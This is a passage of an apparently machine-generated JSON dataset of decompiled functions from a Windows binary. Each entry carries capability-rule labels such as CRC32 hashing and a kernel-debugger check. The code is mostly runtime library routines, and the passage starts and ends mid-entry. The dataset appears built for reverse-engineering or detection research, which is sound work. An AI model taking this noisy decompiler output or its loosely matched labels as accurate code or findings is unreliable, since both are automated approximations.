uVar9 = pcVar14 & 0xfffd | 2;\n        pcVar15 = *(((uVar2 ^ pcVar13) & 0xff) * 4 + 0x44cac0) ^ pcVar13 >> 8;\n        pcVar13 = (pcVar16 + (pcVar15 & 0xff)) * 0x8088405 + 1;\n        *ppcVar1 = pcVar15;\n        in_ECX[0xd] = pcVar13;\n        pcVar14 = pcVar14 >> 8 ^ *(((pcVar13 >> 0x18 ^ pcVar14) & 0xff) * 4 + 0x44cac0);\n        *(&var_28h + var_4ach + 1) = (uVar9 ^ 1) * uVar9 >> 8 ^ uVar2;\n        uVar2 = *(&var_28h + var_4ach + 2);\n        uVar9 = pcVar14 & 0xfffd | 2;\n        in_ECX[0xe] = pcVar14;\n        pcVar15 = *(((uVar2 ^ pcVar15) & 0xff) * 4 + 0x44cac0) ^ pcVar15 >> 8;\n        *ppcVar1 = pcVar15;\n        pcVar13 = (pcVar13 + (pcVar15 & 0xff)) * 0x8088405 + 1;\n        in_ECX[0xd] = pcVar13;\n        pcVar16 = pcVar14 >> 8 ^ *(((pcVar13 >> 0x18 ^ pcVar14) & 0xff) * 4 + 0x44cac0);\n        *(&var_28h + var_4ach + 2) = (uVar9 ^ 1) * uVar9 >> 8 ^ uVar2;\n        uVar2 = *(&var_28h + var_4ach + 3);\n        uVar9 = pcVar16 & 0xfffd | 2;\n        in_ECX[0xe] = pcVar16;\n        pcVar14 = *(((uVar2 ^ pcVar15) & 0xff) * 4 + 0x44cac0) ^ pcVar15 >> 8;\n        iVar8 = var_4ach + 4;\n        var_4a8h = (pcVar13 + (pcVar14 & 0xff)) * 0x8088405 + 1;\n        in_ECX[0xd] = var_4a8h;\n        *ppcVar1 = pcVar14;\n        pcVar15 = pcVar16 >> 8 ^ *(((var_4a8h >> 0x18 ^ pcVar16) & 0xff) * 4 + 0x44cac0);\n        in_ECX[0xe] = pcVar15;\n        *(&var_28h + var_4ach + 3) = (uVar9 ^ 1) * uVar9 >> 8 ^ uVar2;\n        var_4ach = iVar8;\n    } while (iVar8 < 0xc);\n    iVar8 = 0;\n    if (*in_ECX == NULL) {\ncode_r0x0042c5e8:\n        uVar6 = 0;\n    }\n    else {\n        if (!bVar18) {\n            fcn.0042b670(&var_28h, 0xc);\n            in_ECX[6] = in_ECX[6] + 0xc;\n        }\n        if ((*in_ECX == NULL) || (bVar18)) goto code_r0x0042c5e8;\n        uVar6 = 1;\n    }\n    *(in_ECX + 0x2d) = uVar6;\n    if (bVar18) {\n        in_ECX[0x24] = NULL;\n    }\n    else if (iVar4 == 8) {\n        iVar8 = fcn.0042bdb0(&var_49ch);\n    }\n    else if (iVar4 == 0) {\n        iVar8 = fcn.0042bec0();\n    }\n    *(in_ECX + 0x2d) = 0;\n    if ((*(in_ECX + 0x20) != '\\0') && (in_ECX[0x1f] != NULL)) {\n        (**0x4573b8)(in_ECX[0x1f]);\n    }\n    pcVar14 = in_ECX[0x1d];\n    in_ECX[6] = in_ECX[6] + in_ECX[0x24];\n    in_ECX[0x1f] = NULL;\n    in_ECX[0x1c] = pcVar14;\n    if (in_ECX[5] == NULL) {\n        if (iVar8 != 0) {\ncode_r0x0042c2ba:\n            fcn.0042d636(unaff_ESI);\n            return;\n        }\n        pcVar15 = in_ECX[0x24] + var_4b4h;\n        var_490h = in_ECX[0x1e];\n        var_488h = pcVar14;\n        if ((*(in_ECX + 7) == '\\0') || ((*in_ECX != NULL && (!bVar18)))) {\n            if ((var_498h._2_2_ != iVar4) || ((iVar4 == 0 && (var_48ch != pcVar15)))) {\n                var_48ch = pcVar15;\n                fcn.0042d636(unaff_ESI);\n                return;\n            }\n            var_48ch = pcVar15;\n            iVar8 = fcn.0042aa00();\n            if (iVar8 != 0) goto code_r0x0042c2ba;\n            in_ECX[6] = in_ECX[6] + 0x10;\n            var_498h._0_2_ = var_472h._2_2_;\n        }\n        else {\n            if ((var_498h & 1) == 0) {\n                var_498h._0_2_ = var_498h & 0xfff7;\n            }\n            var_472h._2_2_ = var_498h;\n            var_498h._2_2_ = iVar4;\n            var_48ch = pcVar15;\n            cVar5 = fcn.0042b7d0();\n            if (cVar5 == '\\0') {\ncode_r0x0042c716:\n                fcn.0042d636(unaff_ESI);\n                return;\n            }\n            iVar8 = fcn.0042a760();\n            if (iVar8 != 0) goto code_r0x0042c2ba;\n            cVar5 = fcn.0042b7d0();\n            if (cVar5 == '\\0') goto code_r0x0042c716;\n        }\n        if (in_ECX[5] == NULL) {\n            arg_8h_00 = fcn.0042ddfe(var_47ch);\n            fcn.0042f700(arg_8h_00, var_35ch, var_47ch);\n            var_35ch = arg_8h_00;\n            puVar12 = fcn.0042ddfe(0x360);\n            puVar7 = &var_49ch;\n            puVar17 = puVar12;\n            for (iVar8 = 0xd8; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar17 = *puVar7;\n                puVar7 = puVar7 + 1;\n                puVar17 = puVar17 + 1;\n            }\n            pcVar14 = in_ECX[0x11];\n            if (pcVar14 == NULL) {\n                in_ECX[0x11] = puVar12;\n                fcn.0042d636(unaff_ESI);\n                return;\n            }\n            iVar8 = *(pcVar14 + 0x35c);\n            while (iVar8 != 0) {\n                pcVar14 = *(pcVar14 + 0x35c);\n                iVar8 = *(pcVar14 + 0x35c);\n            }\n            *(pcVar14 + 0x35c) = puVar12;\n            fcn.0042d636(unaff_ESI);\n            return;\n        }\n    }\ncode_r0x0042c830:\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 4351
    },
    "0042ddfe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ddfe(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *var_10h;\n    char *var_4h;\n    \n    do {\n        iVar2 = fcn.0042d6d0(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00432cbe(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x455cdc & 1) == 0) {\n        *0x455cdc = *0x455cdc | 1;\n        var_4h = \"bad allocation\";\n        fcn.0042d764(&var_4h);\n        *0x455cd0 = vtable.std::bad_alloc.0;\n        fcn.0042e451(0x443ba1);\n    }\n    fcn.0042d871(0x455cd0);\n    var_10h = vtable.std::bad_alloc.0;\n    fcn.0042f5f6(&var_10h, 0x4510e8);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 275
    },
    "0043644f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043644f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x450f00, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00431736();\n        *puVar2 = 0;\n        puVar2 = fcn.00431723();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x468048)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x468060;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043c61b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00431723();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00431736();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00435d52(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0043651b();\n                goto code_r0x00436512;\n            }\n        }\n        puVar2 = fcn.00431736();\n        *puVar2 = 0;\n        puVar2 = fcn.00431723();\n        *puVar2 = 9;\n        fcn.004330e7();\n    }\ncode_r0x00436512:\n    fcn.00435185();\n    return;\n}\n",
        "token_count": 599
    },
    "0043b017": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043b017(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x450fc0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00431736();\n        *puVar2 = 0;\n        puVar2 = fcn.00431723();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x468048)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x468060;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043c61b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00431723();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00431736();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0043afa2(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0043b0e3();\n                goto code_r0x0043b0da;\n            }\n        }\n        puVar2 = fcn.00431736();\n        *puVar2 = 0;\n        puVar2 = fcn.00431723();\n        *puVar2 = 9;\n        fcn.004330e7();\n    }\ncode_r0x0043b0da:\n    fcn.00435185();\n    return;\n}\n",
        "token_count": 605
    },
    "0043b78c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043b78c(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.0043478b();\n    var_14h = 0;\n    if (*0x456a34 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0043b8e9;\n        *0x456a34 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x456a38 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x456a3c = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x456a44 = (*pcVar4)(uVar3);\n        if (*0x456a44 != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x456a40 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x456a40 == var_18h) || (*0x456a44 == var_18h)) {\ncode_r0x0043b898:\n        if ((((*0x456a38 != var_18h) && (pcVar4 = (*pcVar6)(*0x456a38),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x456a3c != var_18h && (pcVar4 = (*pcVar6)(*0x456a3c),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x456a40);\n        pcVar5 = (*pcVar6)(*0x456a44);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0043b898;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x456a34);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0043b8e9:\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 935
    },
    "0043eb9d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043eb9d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.0042de7e(arg_10h);\n    var_14h = fcn.0043faf0(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0043f04e(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043ebf6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043ec36;\n        }\n        if (iVar1 != 2) {\ncode_r0x0043ec28:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043ec36;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0043ec28;\n        goto code_r0x0043ebf6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0043ec36:\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "0043ec45": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043ec45(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.0042de7e(arg_10h);\n    var_14h = fcn.0043faf0(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0043f59f(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043ec9e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043ecde;\n        }\n        if (iVar1 != 2) {\ncode_r0x0043ecd0:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043ecde;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0043ecd0;\n        goto code_r0x0043ec9e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0043ecde:\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 506
    },
    "004401cc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Removing unreachable block (ram,0x004406db)\n// WARNING: Removing unreachable block (ram,0x004406e5)\n// WARNING: Removing unreachable block (ram,0x004406ea)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004401cc(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint16_t *puVar6;\n    uint16_t uVar7;\n    uint32_t extraout_ECX;\n    int32_t *piVar8;\n    uint16_t uVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    char cVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int16_t *piVar15;\n    int16_t *piVar16;\n    uint16_t uVar17;\n    int32_t iVar18;\n    uint32_t uVar19;\n    uint *puVar20;\n    char *pcVar21;\n    uint var_74h;\n    uint16_t *var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint *var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_20h;\n    uint16_t var_1ch;\n    uint32_t var_1ah;\n    uint var_16h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_60h._0_2_ = arg_10h & 0x8000;\n    uVar11 = arg_10h & 0x7fff;\n    var_30h = 0xcccccccc;\n    var_2ch = 0xcccccccc;\n    var_28h._0_2_ = 0xcccc;\n    var_28h._2_2_ = 0x3ffb;\n    if ((arg_10h & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (uVar11 == 0) {\n        if ((arg_ch == 0) && (arg_8h == 0)) {\n            *arg_1ch = 0;\n            *(arg_1ch + 1) = ((var_60h != 0x8000) - 1U & 0xd) + 0x20;\n            *(arg_1ch + 3) = 0x3001;\n            *(arg_1ch + 5) = 0;\n            arg_8h = CONCAT22(var_1ch, var_20h._2_2_);\n            arg_ch = CONCAT22(var_1ah._2_2_, var_1ah);\n            goto code_r0x00440a78;\n        }\n    }\n    else if (uVar11 == 0x7fff) {\n        *arg_1ch = 1;\n        uVar11 = 0x80000000;\n        if ((arg_ch == 0x80000000) && (arg_8h == 0)) goto code_r0x004402a9;\n        if ((arg_ch & 0x40000000) != 0) goto code_r0x004402a9;\n        pcVar21 = \"1#SNAN\";\ncode_r0x004402f0:\n        iVar18 = fcn.0042dd9f(arg_1ch + 2, 0x16, pcVar21);\n        if (iVar18 != 0) {\n            do {\n                uVar11 = fcn.00433095();\n                arg_ch = extraout_ECX;\ncode_r0x004402a9:\n                if (((arg_10h & 0x8000) == 0) || (arg_ch != 0xc0000000)) {\n                    if ((arg_ch != uVar11) || (arg_8h != 0)) goto code_r0x004402eb;\n                    pcVar21 = \"1#INF\";\n                }\n                else {\n                    if (arg_8h != 0) goto code_r0x004402eb;\n                    pcVar21 = \"1#IND\";\n                }\n                iVar18 = fcn.0042dd9f(arg_1ch + 2, 0x16, pcVar21);\n                if (iVar18 == 0) {\n                    *(arg_1ch + 3) = 5;\n                    goto code_r0x00440306;\n                }\n            } while( true );\n        }\n        *(arg_1ch + 3) = 6;\ncode_r0x00440306:\n        arg_8h = CONCAT22(var_1ch, var_20h._2_2_);\n        arg_ch = CONCAT22(var_1ah._2_2_, var_1ah);\n        goto code_r0x00440a78;\n    }\n    var_4ch._0_2_ = ((uVar11 >> 8) + (arg_ch >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar11 * 0x4d10 >> 0x10;\n    var_20h._0_2_ = 0;\n    uVar13 = var_4ch;\n    var_16h._0_1_ = uVar11;\n    var_16h._1_1_ = uVar11 >> 8;\n    var_1ah._0_2_ = arg_ch;\n    var_1ah._2_2_ = arg_ch >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    var_1ch = arg_8h >> 0x10;\n    var_68h = 0x455780;\n    if (-uVar13 != 0) {\n        uVar11 = -uVar13;\n        if (0 < uVar13) {\n            var_68h = 0x4558e0;\n            uVar11 = uVar13;\n        }\njoined_r0x0044036f:\n        if (uVar11 != 0) {\n            var_68h = var_68h + 0x54;\n            uVar14 = uVar11 >> 3;\n            uVar13 = uVar11 & 7;\n            uVar11 = uVar14;\n            if (uVar13 != 0) {\n                piVar8 = uVar13 * 0xc + var_68h;\n                if (0x7fff < *piVar8) {\n                    var_3ch._0_2_ = *piVar8;\n                    var_3ch._2_2_ = *piVar8 >> 0x10;\n                    piVar2 = piVar8 + 2;\n                    var_38h._0_2_ = piVar8[1];\n                    var_38h._2_2_ = piVar8[1] >> 0x10;\n                    piVar8 = &var_3ch;\n                    var_34h = *piVar2;\n                    iVar18 = CONCAT22(var_38h, var_3ch._2_2_) + -1;\n                    var_3ch._2_2_ = iVar18;\n                    var_38h._0_2_ = iVar18 >> 0x10;\n                }\n                var_48h = 0;\n                var_10h._0_1_ = 0;\n                var_10h._1_1_ = 0;\n                var_10h._2_2_ = 0;\n                var_ch._0_2_ = 0;\n                var_ch._2_2_ = 0;\n                var_8h._0_2_ = 0;\n                var_8h._2_2_ = 0;\n                uVar9 = (*(piVar8 + 10) ^ CONCAT11(var_16h._1_1_, var_16h)) & 0x8000;\n                uVar10 = CONCAT11(var_16h._1_1_, var_16h) & 0x7fff;\n                uVar7 = *(piVar8 + 10) & 0x7fff;\n                uVar17 = uVar7 + uVar10;\n                if (((uVar10 < 0x7fff) && (uVar7 < 0x7fff)) && (uVar17 < 0xbffe)) {\n                    if (0x3fbf < uVar17) {\n                        if (((uVar10 == 0) &&\n                            (uVar17 = uVar17 + 1, \n                            (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, arg_ch >> 0x10)) & 0x7fffffff) == 0)) &&\n                           ((CONCAT22(arg_ch, arg_8h >> 0x10) == 0 && (CONCAT22(arg_8h, var_20h) == 0)))) {\n                            var_16h._0_1_ = 0;\n                            var_16h._1_1_ = 0;\n                            goto joined_r0x0044036f;\n                        }\n                        if (((uVar7 != 0) || (uVar17 = uVar17 + 1,  (piVar8[2] & 0x7fffffffU) != 0)) ||\n                           ((piVar8[1] != 0 || (*piVar8 != 0)))) {\n                            var_54h = 0;\n                            puVar20 = &var_ch;\n                            var_40h = 5;\n                            do {\n                                var_50h = var_40h;\n                                if (0 < var_40h) {\n                                    var_70h = &var_20h + var_54h * 2;\n                                    var_6ch = piVar8 + 2;\n                                    do {\n                                        bVar5 = false;\n                                        uVar13 = puVar20[-1] + *var_70h * *var_6ch;\n                                        if ((uVar13 < puVar20[-1]) || (uVar13 < *var_70h * *var_6ch)) {\n                                            bVar5 = true;\n                                        }\n                                        puVar20[-1] = uVar13;\n                                        if (bVar5) {\n                                            *puVar20 = *puVar20 + 1;\n                                        }\n                                        var_70h = var_70h + 1;\n                                        var_6ch = var_6ch + -2;\n                                        var_50h = var_50h + -1;\n                                    } while (0 < var_50h);\n                                }\n                                puVar20 = puVar20 + 2;\n                                var_54h = var_54h + 1;\n                                var_40h = var_40h + -1;\n                            } while (0 < var_40h);\n                            uVar17 = uVar17 + 0xc002;\n                            if (uVar17 < 1) {\ncode_r0x00440522:\n                                uVar17 = uVar17 - 1;\n                                if (uVar17 < 0) {\n                                    uVar13 = -uVar17;\n                                    uVar17 = 0;\n                                    do {\n                                        if ((var_10h & 1) != 0) {\n                                            var_48h = var_48h + 1;\n                                        }\n                                        iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                                        uVar14 = CONCAT22(var_ch._2_2_, var_ch);\n                                        iVar18 = CONCAT22(var_ch._2_2_, var_ch);\n                                        var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                                        var_8h._2_2_ = var_8h._2_2_ >> 1;\n                                        var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                                        uVar19 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                                        var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar18 << 0x1f) >> 0x10;\n                                        uVar13 = uVar13 - 1;\n                                        var_ch._0_2_ = uVar14 >> 1;\n                                        var_10h._0_1_ = uVar19;\n                                        var_10h._1_1_ = uVar19 >> 8;\n                                    } while (uVar13 != 0);\n                                    if (var_48h != 0) {\n                                        var_10h._0_1_ = var_10h | 1;\n                                    }\n                                }\n                            }\n                            else {\n                                do {\n                                    uVar10 = var_ch._2_2_;\n                                    uVar7 = var_10h._2_2_;\n                                    if ((var_8h._2_2_ & 0x8000) != 0) break;\n                                    iVar18 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                                    var_10h._0_1_ = iVar18;\n                                    var_10h._1_1_ = iVar18 >> 8;\n                                    var_10h._2_2_ = iVar18 >> 0x10;\n                                    iVar18 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                                    var_ch._0_2_ = iVar18 | uVar7 >> 0xf;\n                                    var_ch._2_2_ = iVar18 >> 0x10;\n                                    iVar18 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                                    var_8h._0_2_ = iVar18 | uVar10 >> 0xf;\n                                    uVar17 = uVar17 - 1;\n                                    var_8h._2_2_ = iVar18 >> 0x10;\n                                } while (0 < uVar17);\n                                if (uVar17 < 1) goto code_r0x00440522;\n                            }\n                            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                                    var_10h._2_2_ = 0;\n                                    var_ch._0_2_ = 0;\n                                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                                        var_ch._2_2_ = 0;\n                                        var_8h._0_2_ = 0;\n                                        if (var_8h._2_2_ == 0xffff) {\n                                            var_8h._2_2_ = 0x8000;\n                                            uVar17 = uVar17 + 1;\n                                        }\n                                        else {\n                                            var_8h._2_2_ = var_8h._2_2_ + 1;\n                                        }\n                                    }\n                                    else {\n                                        iVar18 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                                        var_ch._2_2_ = iVar18;\n                                        var_8h._0_2_ = iVar18 >> 0x10;\n                                    }\n                                }\n                                else {\n                                    iVar18 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                                    var_10h._2_2_ = iVar18;\n                                    var_ch._0_2_ = iVar18 >> 0x10;\n                                }\n                            }\n                            if (uVar17 < 0x7fff) {\n                                var_16h._1_1_ = uVar17 >> 8 | uVar9 >> 8;\n                                var_20h._0_2_ = var_10h._2_2_;\n                                var_20h._2_2_ = var_ch;\n                                var_1ch = var_ch._2_2_;\n                                arg_8h = CONCAT22(var_ch._2_2_, var_ch);\n                                var_1ah._0_2_ = var_8h;\n                                var_1ah._2_2_ = var_8h._2_2_;\n                                arg_ch = CONCAT22(var_8h._2_2_, var_8h);\n                                var_16h._0_1_ = uVar17;\n                            }\n                            else {\n                                var_1ch = 0;\n                                var_1ah._0_2_ = 0;\n                                var_20h._0_2_ = 0;\n                                var_20h._2_2_ = 0;\n                                arg_8h = 0;\n                                iVar18 = ((uVar9 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                                var_1ah._2_2_ = iVar18;\n                                arg_ch = 0x80000000;\n                                var_16h._0_1_ = iVar18 >> 0x10;\n                                var_16h._1_1_ = iVar18 >> 0x18;\n                            }\n                            goto joined_r0x0044036f;\n                        }\n                    }\n                    var_1ah._2_2_ = 0;\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                }\n                else {\n                    iVar18 = ((uVar9 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    var_1ah._2_2_ = iVar18;\n                    var_16h._0_1_ = iVar18 >> 0x10;\n                    var_16h._1_1_ = iVar18 >> 0x18;\n                }\n                var_1ch = 0;\n                var_1ah._0_2_ = 0;\n                arg_ch = var_1ah._2_2_ << 0x10;\n                var_20h._0_2_ = 0;\n                var_20h._2_2_ = 0;\n                arg_8h = 0;\n            }\n            goto joined_r0x0044036f;\n        }\n    }\n    var_1ch = arg_8h >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    var_1ah._2_2_ = arg_ch >> 0x10;\n    